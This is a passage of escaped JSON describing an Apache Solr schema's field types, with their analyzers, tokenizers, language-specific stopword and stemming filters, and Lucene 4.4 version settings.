er\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"similarity\":{}},\"ignored\":{\"fields\":[\"ignored_*\"],\"tokenized\":false,\"className\":\"org.apache.solr.schema.StrField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"similarity\":{}},\"int\":{\"fields\":[\"popularity\",\"*_is\",\"*_i\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TrieIntField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"similarity\":{}},\"location\":{\"fields\":[\"store\",\"*_p\"],\"tokenized\":false,\"className\":\"org.apache.solr.schema.LatLonType\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"similarity\":{}},\"location_rpt\":{\"fields\":null,\"tokenized\":false,\"className\":\"org.apache.solr.schema.SpatialRecursivePrefixTreeFieldType\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"similarity\":{}},\"long\":{\"fields\":[\"_version_\",\"*_ls\",\"*_l\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TrieLongField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"similarity\":{}},\"lowercase\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.KeywordTokenizerFactory\",\"args\":{\"class\":\"solr.KeywordTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.KeywordTokenizerFactory\",\"args\":{\"class\":\"solr.KeywordTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"}}},\"similarity\":{}},\"payloads\":{\"fields\":[\"payloads\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.WhitespaceTokenizerFactory\",\"args\":{\"class\":\"solr.WhitespaceTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"DelimitedPayloadTokenFilterFactory\":{\"args\":{\"class\":\"solr.DelimitedPayloadTokenFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\",\"encoder\":\"float\"},\"className\":\"org.apache.lucene.analysis.payloads.DelimitedPayloadTokenFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.WhitespaceTokenizerFactory\",\"args\":{\"class\":\"solr.WhitespaceTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"DelimitedPayloadTokenFilterFactory\":{\"args\":{\"class\":\"solr.DelimitedPayloadTokenFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\",\"encoder\":\"float\"},\"className\":\"org.apache.lucene.analysis.payloads.DelimitedPayloadTokenFilterFactory\"}}},\"similarity\":{}},\"pdate\":{\"fields\":null,\"tokenized\":false,\"className\":\"org.apache.solr.schema.DateField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"similarity\":{}},\"pdouble\":{\"fields\":null,\"tokenized\":false,\"className\":\"org.apache.solr.schema.DoubleField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"similarity\":{}},\"pfloat\":{\"fields\":null,\"tokenized\":false,\"className\":\"org.apache.solr.schema.FloatField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"similarity\":{}},\"phonetic\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"DoubleMetaphoneFilterFactory\":{\"args\":{\"inject\":\"false\",\"class\":\"solr.DoubleMetaphoneFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.phonetic.DoubleMetaphoneFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"DoubleMetaphoneFilterFactory\":{\"args\":{\"inject\":\"false\",\"class\":\"solr.DoubleMetaphoneFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.phonetic.DoubleMetaphoneFilterFactory\"}}},\"similarity\":{}},\"pint\":{\"fields\":[\"*_pi\"],\"tokenized\":false,\"className\":\"org.apache.solr.schema.IntField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"similarity\":{}},\"plong\":{\"fields\":null,\"tokenized\":false,\"className\":\"org.apache.solr.schema.LongField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"similarity\":{}},\"point\":{\"fields\":null,\"tokenized\":false,\"className\":\"org.apache.solr.schema.PointType\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"similarity\":{}},\"random\":{\"fields\":[\"random_*\"],\"tokenized\":false,\"className\":\"org.apache.solr.schema.RandomSortField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"similarity\":{}},\"string\":{\"fields\":[\"cat\",\"id\",\"manu_exact\",\"content_type\",\"links\",\"*_ss\",\"*_s\"],\"tokenized\":false,\"className\":\"org.apache.solr.schema.StrField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"queryAnalyzer\":{\"className\":\"org.apache.solr.schema.FieldType$DefaultAnalyzer\"},\"similarity\":{}},\"tdate\":{\"fields\":[\"*_tdt\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TrieDateField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"similarity\":{}},\"tdouble\":{\"fields\":[\"*_coordinate\",\"*_td\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TrieDoubleField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.solr.analysis.TrieTokenizerFactory\",\"args\":{}}},\"similarity\":{}},\"text_ar\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_ar.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"ArabicNormalizationFilterFactory\":{\"args\":{\"class\":\"solr.ArabicNormalizationFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ar.ArabicNormalizationFilterFactory\"},\"ArabicStemFilterFactory\":{\"args\":{\"class\":\"solr.ArabicStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ar.ArabicStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_ar.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"ArabicNormalizationFilterFactory\":{\"args\":{\"class\":\"solr.ArabicNormalizationFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ar.ArabicNormalizationFilterFactory\"},\"ArabicStemFilterFactory\":{\"args\":{\"class\":\"solr.ArabicStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ar.ArabicStemFilterFactory\"}}},\"similarity\":{}},\"text_bg\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_bg.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"BulgarianStemFilterFactory\":{\"args\":{\"class\":\"solr.BulgarianStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.bg.BulgarianStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_bg.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"BulgarianStemFilterFactory\":{\"args\":{\"class\":\"solr.BulgarianStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.bg.BulgarianStemFilterFactory\"}}},\"similarity\":{}},\"text_ca\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"ElisionFilterFactory\":{\"args\":{\"articles\":\"lang/contractions_ca.txt\",\"class\":\"solr.ElisionFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.util.ElisionFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_ca.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Catalan\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"ElisionFilterFactory\":{\"args\":{\"articles\":\"lang/contractions_ca.txt\",\"class\":\"solr.ElisionFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.util.ElisionFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_ca.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Catalan\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"similarity\":{}},\"text_cjk\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"CJKWidthFilterFactory\":{\"args\":{\"class\":\"solr.CJKWidthFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.cjk.CJKWidthFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"CJKBigramFilterFactory\":{\"args\":{\"class\":\"solr.CJKBigramFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.cjk.CJKBigramFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"CJKWidthFilterFactory\":{\"args\":{\"class\":\"solr.CJKWidthFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.cjk.CJKWidthFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"CJKBigramFilterFactory\":{\"args\":{\"class\":\"solr.CJKBigramFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.cjk.CJKBigramFilterFactory\"}}},\"similarity\":{}},\"text_cz\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_cz.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"CzechStemFilterFactory\":{\"args\":{\"class\":\"solr.CzechStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.cz.CzechStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_cz.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"CzechStemFilterFactory\":{\"args\":{\"class\":\"solr.CzechStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.cz.CzechStemFilterFactory\"}}},\"similarity\":{}},\"text_da\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_da.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Danish\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_da.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Danish\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"similarity\":{}},\"text_de\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_de.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"GermanNormalizationFilterFactory\":{\"args\":{\"class\":\"solr.GermanNormalizationFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.de.GermanNormalizationFilterFactory\"},\"GermanLightStemFilterFactory\":{\"args\":{\"class\":\"solr.GermanLightStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.de.GermanLightStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_de.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"GermanNormalizationFilterFactory\":{\"args\":{\"class\":\"solr.GermanNormalizationFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.de.GermanNormalizationFilterFactory\"},\"GermanLightStemFilterFactory\":{\"args\":{\"class\":\"solr.GermanLightStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.de.GermanLightStemFilterFactory\"}}},\"similarity\":{}},\"text_el\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"GreekLowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.GreekLowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.el.GreekLowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_el.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"false\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"GreekStemFilterFactory\":{\"args\":{\"class\":\"solr.GreekStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.el.GreekStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"GreekLowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.GreekLowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.el.GreekLowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_el.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"false\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"GreekStemFilterFactory\":{\"args\":{\"class\":\"solr.GreekStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.el.GreekStemFilterFactory\"}}},\"similarity\":{}},\"text_en\":{\"fields\":[\"*_en\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_en.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"EnglishPossessiveFilterFactory\":{\"args\":{\"class\":\"solr.EnglishPossessiveFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.en.EnglishPossessiveFilterFactory\"},\"KeywordMarkerFilterFactory\":{\"args\":{\"protected\":\"protwords.txt\",\"class\":\"solr.KeywordMarkerFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.KeywordMarkerFilterFactory\"},\"PorterStemFilterFactory\":{\"args\":{\"class\":\"s